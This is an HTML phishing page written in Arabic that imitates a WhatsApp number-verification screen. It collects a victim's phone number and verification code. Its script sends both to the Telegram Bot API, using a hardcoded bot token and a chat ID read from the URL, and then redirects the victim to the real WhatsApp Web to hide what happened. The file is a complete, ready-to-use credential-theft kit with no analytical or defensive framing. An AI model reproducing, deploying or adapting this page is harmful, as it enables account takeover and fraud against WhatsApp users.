<!DOCTYPE html>
<html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>WhatsApp</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#075e54;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;padding:20px;border-radius:12px;width:360px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.15)}
img{width:80px;margin-bottom:10px}h2{color:#075e54;margin-bottom:15px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:16px}
.btn{background:#25d366;color:#fff;border:none;padding:12px;width:100%;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}.btn:hover{background:#1ebc59}</style></head>
<body><div class="card">
<img src="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png" alt="WhatsApp">
<h2>توثيق رقم الواتساب</h2>
<p style="color:#667781;font-size:14px;margin-bottom:12px">أدخل رقم هاتفك لاستلام كود التحقق</p>
<input id="u" placeholder="رقم الهاتف الدولي"><br>
<input id="p" type="password" placeholder="كود التحقق"><br>
<button class="btn" onclick="sendData()">تسجيل الدخول</button>
</div>
<script>
const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');
function sendData(){const u=document.getElementById('u').value,pa=document.getElementById('p').value;
if(!u||!pa)return alert('املأ جميع الحقول');
fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('💬 WhatsApp\n👤 '+u+'\n🔑 '+pa)}`)
.then(()=>{location.href='https://web.whatsapp.com/'})}
</script></body></html>
